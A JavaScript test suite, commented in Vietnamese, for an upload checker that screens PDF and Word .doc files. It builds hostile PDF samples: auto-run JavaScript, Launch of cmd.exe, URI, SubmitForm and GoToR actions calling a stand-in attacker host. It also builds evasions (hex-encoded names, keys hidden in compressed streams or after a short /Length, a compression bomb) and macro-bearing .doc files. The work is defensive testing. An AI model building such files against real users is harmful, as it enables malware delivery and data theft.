/**
 * BUG-034 — BỘ KIỂM TÀI LIỆU: KHÔNG CHẶN NHẦM PDF THƯỜNG, KHÔNG LỌT PDF/WORD NGUY HIỂM
 * ============================================================================
 *
 * Bộ kiểm cũ so CHUỖI CON trên byte thô:
 *   · chặn nhầm: "/AA" khớp tên phông nhúng "/AAAAAA+Tên" (Chrome, LibreOffice…),
 *     "/OpenAction" khớp chỉ dẫn mở trang "/OpenAction [1 0 R /XYZ …]" — gần như
 *     mọi PDF có chữ bị bỏ, người dân mất chứng cứ;
 *   · có thể lọt: khoá nằm trong luồng nén (/ObjStm), hoặc viết bằng mã #xx
 *     (/J#61vaScript = /JavaScript) thì byte thô không có chuỗi đó;
 *   · Word .doc (97–2003) có macro không bị soi (chỉ tìm vbaProject.bin của .docx).
 *
 * Biến thể lấy từ buglogs/bugs/BUG-034.md (a)–(f). PDF "thật" là tệp do Chrome
 * (Skia) và LibreOffice xuất; PDF nguy hiểm dựng tay theo đặc tả PDF 1.7. Dữ liệu GIẢ.
 */
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { deflateSync } from 'node:zlib';

const { kiemTaiLieu } = await import('../src/lib/tai-lieu-an-toan.js');

const fixture = (ten) => readFile(new URL(`./fixtures/${ten}`, import.meta.url));
const dataUrl = (buf, mime = 'application/pdf') => `data:${mime};base64,${Buffer.from(buf).toString('base64')}`;
const kiem = (buf, ten = 'don.pdf', mime) => kiemTaiLieu(dataUrl(buf, mime), ten);

/* ------------------------------------------------------------------ dựng PDF */

/** Dựng một PDF hợp cấu trúc: mỗi phần tử là thân đối tượng (string hoặc Buffer), số đối tượng = vị trí + 1 */
function taoPdf(doiTuong, { trailerThem = '' } = {}) {
  const phan = [Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'latin1')];
  const viTri = [];
  let dai = phan[0].length;
  doiTuong.forEach((than, i) => {
    const b = Buffer.concat([
      Buffer.from(`${i + 1} 0 obj\n`, 'latin1'),
      Buffer.isBuffer(than) ? than : Buffer.from(than, 'latin1'),
      Buffer.from('\nendobj\n', 'latin1'),
    ]);
    viTri.push(dai);
    dai += b.length;
    phan.push(b);
  });
  const xref = [`xref\n0 ${doiTuong.length + 1}\n0000000000 65535 f \n`,
    ...viTri.map((v) => `${String(v).padStart(10, '0')} 00000 n \n`)].join('');
  phan.push(Buffer.from(`${xref}trailer\n<< /Size ${doiTuong.length + 1} /Root 1 0 R ${trailerThem}>>\nstartxref\n${dai}\n%%EOF\n`, 'latin1'));
  return Buffer.concat(phan);
}

/** Luồng có độ dài đúng */
function luong(dict, noiDung) {
  const b = Buffer.isBuffer(noiDung) ? noiDung : Buffer.from(noiDung, 'latin1');
  return Buffer.concat([Buffer.from(`<< ${dict} /Length ${b.length} >>\nstream\n`, 'latin1'), b, Buffer.from('\nendstream', 'latin1')]);
}

/** Luồng đối tượng nén (/ObjStm, PDF 1.5+) chứa các đối tượng {so, than} */
function objStm(doiTuong, { loc = '/FlateDecode', hong = false, nenThem = null } = {}) {
  let than = '';
  const dau = [];
  for (const d of doiTuong) { dau.push(`${d.so} ${than.length}`); than += `${d.than}\n`; }
  const dauChuoi = `${dau.join(' ')}\n`;
  let duLieu = Buffer.from(dauChuoi + than, 'latin1');
  if (nenThem) duLieu = Buffer.concat([duLieu, nenThem]);
  if (loc === '/FlateDecode') duLieu = deflateSync(duLieu);
  if (hong) duLieu = Buffer.concat([duLieu.subarray(0, 6), Buffer.from('rac-khong-giai-nen-duoc', 'latin1')]);
  return luong(`/Type /ObjStm /N ${doiTuong.length} /First ${dauChuoi.length}${loc ? ` /Filter ${loc}` : ''}`, duLieu);
}

const NOI_DUNG = 'BT /F1 12 Tf 72 760 Td (Don to giac - Kinh gui Cong an phuong) Tj ET';
const PHONG = '<< /Type /Font /Subtype /TrueType /BaseFont /BCDEEE+Calibri /FirstChar 32 /LastChar 126 >>';

/** Một PDF đơn từ bình thường; `catalogThem`, `trangThem` chèn thêm khoá; `them` thêm đối tượng từ số 6 */
function pdfDon({ catalogThem = '', trangThem = '', them = [], phong = PHONG, trailerThem } = {}) {
  return taoPdf([
    `<< /Type /Catalog /Pages 2 0 R ${catalogThem}>>`,
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R ${trangThem}>>`,
    phong,
    luong('', NOI_DUNG),
    ...them,
  ], { trailerThem });
}

const nhan = (kq, ghiChu) => assert.equal(kq.hopLe, true, `${ghiChu}: phải NHẬN, nhưng bị chặn — ${kq.lyDo}`);
const chan = (kq, ghiChu) => assert.equal(kq.hopLe, false, `${ghiChu}: phải CHẶN, nhưng được nhận`);

/* ------------------------------------------------------------- (a) PDF thật */

describe('BUG-034 (a) — PDF người dân hay gửi phải được nhận', () => {
  for (const [tep, nguon] of [
    ['pdf-co-lop-chu.pdf', 'Chrome "Lưu thành PDF" (Skia) — tên phông /AAAAAA+…'],
    ['pdf-phong-vntime.pdf', 'Chrome (Skia), phông .VnTime'],
    ['pdf-phong-vni.pdf', 'có /OpenAction [1 0 R /XYZ …] — chỉ dẫn mở trang'],
    ['pdf-libreoffice-don.pdf', 'LibreOffice 24.2 xuất PDF — /OpenAction mảng đích'],
    ['ocr-pdf-scan.pdf', 'PDF scan (chỉ có ảnh)'],
  ]) {
    test(`${tep} — ${nguon}`, async () => nhan(kiem(await fixture(tep)), tep));
  }

  test('PDF kiểu Word "Save as PDF": phông /BCDEEE+Calibri, cây cấu trúc', () => {
    nhan(kiem(pdfDon({ catalogThem: '/MarkInfo << /Marked true >> /StructTreeRoot 6 0 R /Lang (vi-VN) ', them: ['<< /Type /StructTreeRoot >>'] })), 'Word');
  });

  test('tên phông tập con bắt đầu bằng AA, JS không phải khoá nguy hiểm', () => {
    nhan(kiem(pdfDon({ phong: '<< /Type /Font /Subtype /Type1 /BaseFont /AAAAAA+TimesNewRomanPSMT >>' })), '/AAAAAA+');
    nhan(kiem(pdfDon({ phong: '<< /Type /Font /Subtype /Type1 /BaseFont /JSHelvetica /AABBCC 1 >>' })), '/JSHelvetica');
  });

  test('liên kết thường (/URI, người đọc phải bấm) được nhận', () => {
    nhan(kiem(pdfDon({ trangThem: '/Annots [6 0 R] ', them: ['<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://congan.tphcm.gov.vn) >> >>'] })), 'link');
  });

  test('PDF 1.5 nén đối tượng (/ObjStm) bình thường được nhận', () => {
    const pdf = taoPdf([
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 5 0 R >>',
      objStm([{ so: 7, than: PHONG }, { so: 8, than: '<< /Producer (Microsoft Word) >>' }]),
      luong('/Filter /FlateDecode', deflateSync(Buffer.from(NOI_DUNG))),
    ]);
    nhan(kiem(pdf), 'ObjStm thường');
  });
});

/* ------------------------------------------------------- (b) /OpenAction */

describe('BUG-034 (b) — /OpenAction: chỉ dẫn mở trang thì nhận, hành động thì chặn', () => {
  test('mảng đích trực tiếp', () => nhan(kiem(pdfDon({ catalogThem: '/OpenAction [3 0 R /Fit] ' })), 'mảng'));
  test('tham chiếu tới đối tượng là mảng đích', () => {
    nhan(kiem(pdfDon({ catalogThem: '/OpenAction 6 0 R ', them: ['[3 0 R /XYZ 0 842 0]'] })), 'ref mảng');
  });
  test('hành động /GoTo (nhảy tới trang trong tệp)', () => {
    nhan(kiem(pdfDon({ catalogThem: '/OpenAction << /S /GoTo /D [3 0 R /Fit] >> ' })), 'GoTo');
  });

  for (const [ten, hanhDong] of [
    ['JavaScript', '<< /S /JavaScript /JS (app.alert\\(1\\)) >>'],
    ['Launch', '<< /S /Launch /F (cmd.exe) >>'],
    ['URI tự mở trang web khi mở tệp', '<< /S /URI /URI (http://ke-xau.example/da-mo) >>'],
    ['SubmitForm', '<< /S /SubmitForm /F (http://ke-xau.example) >>'],
  ]) {
    test(`hành động ${ten} trực tiếp`, () => chan(kiem(pdfDon({ catalogThem: `/OpenAction ${hanhDong} ` })), ten));
    test(`hành động ${ten} qua tham chiếu`, () => chan(kiem(pdfDon({ catalogThem: '/OpenAction 6 0 R ', them: [hanhDong] })), ten));
  }

  test('tham chiếu tới đối tượng không tồn tại — không kiểm được thì chặn', () => {
    chan(kiem(pdfDon({ catalogThem: '/OpenAction 42 0 R ' })), 'ref treo');
  });

  for (const [ten, a] of [
    ['ImportData', '<< /S /ImportData /F (du-lieu.fdf) >>'],
    ['GoToR (mở tệp khác)', '<< /S /GoToR /F (\\\\\\\\may-ke-xau\\\\chia-se\\\\x.pdf) /D [0 /Fit] >>'],
    ['GoToE (mở tệp nhúng)', '<< /S /GoToE /T << /R /C /N (x) >> >>'],
  ]) {
    test(`liên kết dùng hành động ${ten} bị chặn`, () => {
      chan(kiem(pdfDon({ trangThem: '/Annots [6 0 R] ', them: [`<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A ${a} >>`] })), ten);
    });
  }
});

/* -------------------------------------------------- (c) khoá ngắn /JS, /AA */

describe('BUG-034 (c) — khoá nguy hiểm thật vẫn bị chặn', () => {
  test('/AA (hành động tự chạy khi mở trang)', () => {
    chan(kiem(pdfDon({ trangThem: '/AA << /O 6 0 R >> ', them: ['<< /S /JavaScript /JS (x) >>'] })), '/AA');
    chan(kiem(pdfDon({ trangThem: '/AA<</O<</S/GoTo/D[3 0 R/Fit]>>>> ' })), '/AA dính liền');
  });
  test('/JS đứng riêng làm khoá', () => chan(kiem(pdfDon({ them: ['<< /JS (app.alert\\(1\\)) >>'] })), '/JS'));
  test('/Names /JavaScript', () => chan(kiem(pdfDon({ catalogThem: '/Names << /JavaScript 6 0 R >> ', them: ['<< /Names [(a) 7 0 R] >>'] })), '/Names'));
  test('/EmbeddedFiles, /RichMedia, /XFA, /Launch', () => {
    chan(kiem(pdfDon({ catalogThem: '/Names << /EmbeddedFiles 6 0 R >> ', them: ['<< /Names [] >>'] })), 'EmbeddedFiles');
    chan(kiem(pdfDon({ them: ['<< /Type /Annot /Subtype /RichMedia >>'] })), 'RichMedia');
    chan(kiem(pdfDon({ catalogThem: '/AcroForm << /XFA 6 0 R >> ', them: ['<< >>'] })), 'XFA');
    chan(kiem(pdfDon({ them: ['<< /S /Launch /Win << /F (calc.exe) >> >>'] })), 'Launch');
  });
});

/* ----------------------------------------- (d) giấu trong luồng nén / mã #xx */

describe('BUG-034 (d) — không lọt khoá nằm trong luồng nén hoặc viết bằng mã #xx', () => {
  test('tên viết bằng mã #xx ở byte thô', () => {
    chan(kiem(pdfDon({ catalogThem: '/Names << /J#61vaScript 6 0 R >> ', them: ['<< >>'] })), '/J#61vaScript');
    chan(kiem(pdfDon({ catalogThem: '/Op#65nAction << /S /L#61unch /F (cmd.exe) >> ' })), '/Op#65nAction');
  });

  /* Byte thô của ba PDF dưới đây KHÔNG có khoá nguy hiểm nào — chỉ có trong luồng nén */
  test('/JavaScript nằm trong luồng đối tượng nén', () => {
    const pdf = taoPdf([
      '<< /Type /Catalog /Pages 2 0 R /Names 7 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>',
      objStm([{ so: 7, than: '<< /JavaScript 8 0 R >>' }, { so: 8, than: '<< /Names [(a) << /S /JavaScript /JS (app.alert\\(1\\)) >>] >>' }]),
    ]);
    chan(kiem(pdf), 'ObjStm JavaScript');
  });

  test('mã #xx bên trong luồng nén', () => {
    const pdf = taoPdf([
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Annots [7 0 R] >>',
      objStm([{ so: 7, than: '<< /Type /Annot /Subtype /Link /Rect [0 0 9 9] /A << /S /J#61va#53cript /J#53 (x) >> >>' }]),
    ]);
    chan(kiem(pdf), 'ObjStm #xx');
  });

  test('/Launch trong luồng nén, chỉ trỏ tới từ danh sách chú thích', () => {
    const pdf = taoPdf([
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Annots [7 0 R] >>',
      objStm([{ so: 7, than: '<< /Type /Annot /Subtype /Link /Rect [0 0 9 9] /A << /S /Launch /F (cmd.exe) >> >>' }]),
    ]);
    chan(kiem(pdf), 'ObjStm Launch annot');
  });

  test('/OpenAction trỏ vào đối tượng trong luồng nén là /Launch', () => {
    const pdf = taoPdf([
      '<< /Type /Catalog /Pages 2 0 R /OpenAction 8 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>',
      objStm([{ so: 7, than: PHONG }, { so: 8, than: '<< /S /Launch /F (cmd.exe) >>' }]),
    ]);
    chan(kiem(pdf), 'ObjStm Launch');
  });

  test('đối tượng nguy hiểm giấu trong byte của một luồng không nén', () => {
    const pdf = pdfDon({ them: [luong('', `${NOI_DUNG}\n9 0 obj\n<< /S /JavaScript /JS (x) >>\nendobj\n`)] });
    chan(kiem(pdf), 'giấu trong luồng');
  });
});

/* ---------------------------------------------- (e) không kiểm được thì chặn */

describe('BUG-034 (e) — không kiểm được thì chặn (luật 1)', () => {
  const khung = (luongDoiTuong, trailerThem) => taoPdf([
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>',
    luongDoiTuong,
  ], { trailerThem });

  test('luồng đối tượng nén hỏng', () => chan(kiem(khung(objStm([{ so: 7, than: '<< >>' }], { hong: true }))), 'nén hỏng'));
  test('luồng đối tượng dùng bộ lọc máy không giải được (LZW, ASCII85)', () => {
    chan(kiem(khung(objStm([{ so: 7, than: '<< >>' }], { loc: '/LZWDecode' }))), 'LZW');
    chan(kiem(khung(objStm([{ so: 7, than: '<< >>' }], { loc: '[/ASCII85Decode /FlateDecode]' }))), 'ASCII85');
  });
  test('PDF mã hoá có luồng đối tượng nén (nội dung luồng bị mã hoá, không soi được)', () => {
    chan(kiem(khung(objStm([{ so: 7, than: '<< >>' }]), '/Encrypt << /Filter /Standard /V 2 /R 3 >> ')), 'Encrypt + ObjStm');
  });
  test('bom nén: giải nén ra quá lớn', () => {
    const pdf = khung(objStm([{ so: 7, than: '<< >>' }], { nenThem: Buffer.alloc(80 * 1024 * 1024) }));
    assert.ok(pdf.length < 1024 * 1024, 'tệp mẫu phải nhỏ');
    chan(kiem(pdf), 'bom nén');
  });
});

/* ------------------------------------------------------ (f) Word có macro */

/** Dựng tệp CFB (Word 97–2003) tối thiểu, thư mục gồm các mục `ten` (loại 1 = kho, 2 = luồng) */
function taoCfb(muc) {
  const S = 512;
  const dau = Buffer.alloc(S, 0);
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(dau, 0);
  dau.writeUInt16LE(0x3e, 0x18); dau.writeUInt16LE(3, 0x1a); dau.writeUInt16LE(0xfffe, 0x1c);
  dau.writeUInt16LE(9, 0x1e); dau.writeUInt16LE(6, 0x20);
  dau.writeUInt32LE(1, 0x2c); /* 1 sector FAT */
  dau.writeUInt32LE(1, 0x30); /* thư mục ở sector 1 */
  dau.writeUInt32LE(4096, 0x38);
  dau.writeUInt32LE(0xfffffffe, 0x3c); dau.writeUInt32LE(0, 0x40);
  dau.writeUInt32LE(0xfffffffe, 0x44); dau.writeUInt32LE(0, 0x48);
  for (let i = 0; i < 109; i += 1) dau.writeUInt32LE(i === 0 ? 0 : 0xffffffff, 0x4c + i * 4);
  const fat = Buffer.alloc(S, 0xff);
  fat.writeUInt32LE(0xfffffffd, 0); fat.writeUInt32LE(0xfffffffe, 4);
  const thuMuc = Buffer.alloc(S, 0);
  [{ ten: 'Root Entry', loai: 5 }, ...muc].slice(0, 4).forEach((m, i) => {
    const o = i * 128;
    const t = Buffer.from(`${m.ten}\0`, 'utf16le');
    t.copy(thuMuc, o);
    thuMuc.writeUInt16LE(t.length, o + 0x40);
    thuMuc[o + 0x42] = m.loai;
    thuMuc.writeUInt32LE(0xffffffff, o + 0x44); thuMuc.writeUInt32LE(0xffffffff, o + 0x48);
    thuMuc.writeUInt32LE(i === 0 && muc.length ? 1 : 0xffffffff, o + 0x4c);
    thuMuc.writeUInt32LE(0xfffffffe, o + 0x74); thuMuc.writeUInt32LE(0, o + 0x78);
  });
  return Buffer.concat([dau, fat, thuMuc]);
}

const MIME_DOC = 'application/msword';

describe('BUG-034 (f) — Word: macro trong .doc 97–2003 cũng bị chặn', () => {
  test('tệp .doc thật không macro (LibreOffice xuất) được nhận', async () => {
    for (const tep of ['word97-unicode.doc', 'word97-phong-vni.doc']) nhan(kiem(await fixture(tep), tep, MIME_DOC), tep);
  });
  test('.doc có kho "Macros" (Word 97–2003 cất macro VBA ở đó) bị chặn', () => {
    chan(kiem(taoCfb([{ ten: 'WordDocument', loai: 2 }, { ten: 'Macros', loai: 1 }]), 'don.doc', MIME_DOC), 'Macros');
  });
  test('.doc có luồng _VBA_PROJECT bị chặn, kể cả viết chữ thường', () => {
    chan(kiem(taoCfb([{ ten: 'WordDocument', loai: 2 }, { ten: '_vba_project', loai: 2 }]), 'don.doc', MIME_DOC), '_VBA_PROJECT');
  });
  test('.doc dựng tay không macro được nhận (đối chứng cho hai test trên)', () => {
    nhan(kiem(taoCfb([{ ten: 'WordDocument', loai: 2 }, { ten: '1Table', loai: 2 }]), 'don.doc', MIME_DOC), 'đối chứng');
  });
  test('.doc hỏng cấu trúc (đúng chữ ký nhưng không đọc được thư mục) bị chặn', () => {
    const hong = Buffer.concat([Buffer.from('d0cf11e0a1b11ae1', 'hex'), Buffer.alloc(2000, 0x41)]);
    chan(kiem(hong, 'don.doc', MIME_DOC), 'hỏng');
  });
});

/* ---------------------------------------- lỗi trọng tài P58 tìm ra ở bản vá đầu */

describe('BUG-034 — trọng tài: bản vá không được tạo lỗi mới', () => {
  const doThoiGian = (buf) => { const t = Date.now(); const kq = kiem(buf); return { kq, ms: Date.now() - t }; };

  test('DoS: nhiều đối tượng trùng số không làm máy treo (trước: 40k bản ≈ 8,5 giây)', () => {
    const lap = Array(40000).fill('9 0 obj\n[3 0 R /Fit]\nendobj\n').join('');
    const pdf = Buffer.concat([pdfDon(), Buffer.from(lap, 'latin1')]);
    const { ms } = doThoiGian(pdf);
    assert.ok(ms < 2000, `mất ${ms} ms`);
  });

  test('DoS: nhiều /OpenAction trỏ cùng đối tượng định nghĩa nhiều lần không thành bậc hai', () => {
    const dinh = Array(20000).fill('6 0 obj\n[3 0 R /Fit]\nendobj\n').join('');
    const tro = Array(20000).fill('<< /OpenAction 6 0 R >>\n').join('');
    const pdf = Buffer.concat([pdfDon(), Buffer.from(dinh + tro, 'latin1')]);
    const { kq, ms } = doThoiGian(pdf);
    assert.ok(ms < 3000, `mất ${ms} ms`);
    nhan(kq, 'đích hợp lệ lặp lại');
  });

  /* Luồng khai /Length ngắn: trình đọc (đã thử pdfium) dừng luồng theo /Length và
     đọc các đối tượng nằm sau đó qua bảng xref — bộ kiểm cắt theo "endstream" đầu
     tiên thì coi chúng là byte luồng. */
  const luongKheHo = (them) => Buffer.from(`<< /Length 5 >>\nstream\nABCDE\n${them}\nendstream`, 'latin1');

  test('đối tượng /GoToR giấu sau /Length của một luồng bị chặn', () => {
    const pdf = pdfDon({
      trangThem: '/Annots [7 0 R] ',
      them: [luongKheHo('7 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 0 9 9] /A << /S /GoToR /F (http://ke-xau.example/x) /D [0 /Fit] >> >>\nendobj')],
    });
    chan(kiem(pdf), 'GoToR sau /Length');
  });

  test('định nghĩa lại đối tượng của /OpenAction giấu sau /Length bị chặn', () => {
    const pdf = pdfDon({
      catalogThem: '/OpenAction 6 0 R ',
      them: ['[3 0 R /Fit]', luongKheHo('6 0 obj\n<< /S /GoToE /T << /R /C /N (x) >> >>\nendobj')],
    });
    chan(kiem(pdf), 'OpenAction định nghĩa lại');
  });

  test('/AA, /XFA giấu sau /Length bị chặn', () => {
    chan(kiem(pdfDon({ them: [luongKheHo('3 0 obj\n<< /Type /Page /Parent 2 0 R /AA << /O 8 0 R >> >>\nendobj')] })), 'AA');
    chan(kiem(pdfDon({ them: [luongKheHo('1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /XFA 9 0 R >> >>\nendobj')] })), 'XFA');
  });
});
